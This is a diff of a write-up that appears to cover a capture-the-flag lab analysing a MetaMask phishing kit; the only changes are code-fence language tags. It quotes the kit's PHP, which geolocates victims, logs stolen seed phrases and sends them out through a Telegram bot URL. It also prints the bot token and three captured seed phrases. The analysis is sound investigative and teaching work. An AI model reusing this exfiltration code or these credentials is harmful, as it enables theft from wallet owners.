@@ -12,7 +12,7 @@ WWW display 3 wallets:
 
 I checked structure of web site directory. Only one directory contained suspicious PHP script:
 
-```PHP
+```
 c75-GrabThePhisher\pankewk\metamask\metamask.php
 ```
 
@@ -28,7 +28,7 @@ Script is written in PHP language.
 
 <span class="fw-bold">Code of the script:</span>
 
-```PHP
+```php
 <?php
 
 $request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
@@ -76,7 +76,7 @@ sendTel($message);
 
 Line 3 shows the phisher is using Sypex Geo service to gather intelligence
 
-```PHP
+```php
 $request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR']); 
 ```
 
@@ -84,13 +84,13 @@ $request = file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_AD
 
 Line 36 shows that all gathered data are stored in root directory of web page in log directory in log.txt file.
 
-```PHP
+```php
         @file_put_contents($_SERVER['DOCUMENT_ROOT'].'/log/'.'log.txt', $text, FILE_APPEND);	
 ```
 
 File log.txt contains 3 entries:
 
-```PHP
+```php
 number edge rebuild stomach review course sphere absurd memory among drastic total
 bomb stairs satisfy host barrel absorb dentist prison capital faint hedgehog worth
 father also recycle embody balance concert mechanic believe owner pair muffin hockey
@@ -104,7 +104,7 @@ father also recycle embody balance concert mechanic believe owner pair muffin ho
 
 <span class="fw-bold">Line 34 shows that script is using telegram bot api.</span>
 
-```PHP
+```php
 		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
 ```
 
@@ -113,7 +113,7 @@ father also recycle embody balance concert mechanic believe owner pair muffin ho
 
 <span class="fw-bold">Line 33 contains variable named $token with value:</span>
 
-```PHP
+```php
         $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
 ```
 
@@ -121,7 +121,7 @@ father also recycle embody balance concert mechanic believe owner pair muffin ho
 
 Line 32 contains variable named $id with value:
 
-```PHP
+```php
 		$id = "5442785564"; 
 ```
 
@@ -129,7 +129,7 @@ Line 32 contains variable named $id with value:
 
 <span class="fw-bold">Author of phishing script left comment in phishing kit file. Lines 10-18 contains this message. At the end of it author signed message:</span>
 
-```PHP
+```php
 /*
  With love and respect to all the hustler out there,
  This is a small gift to my brothers,
@@ -149,13 +149,13 @@ I used API method getChat.
 
 All queries to the Telegram Bot API must be served over HTTPS and need to be presented in this form: `https://api.telegram.org/bot<token>/METHOD_NAME`. Like this for example:
 
-```HTML
+```html
 https://api.telegram.org/bot5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10/getChat?chat_id=5442785564
 ```
 
 Response from Telegram API:
 
-```JSON
+```json
 {
 	"ok": true,
 	"result": {
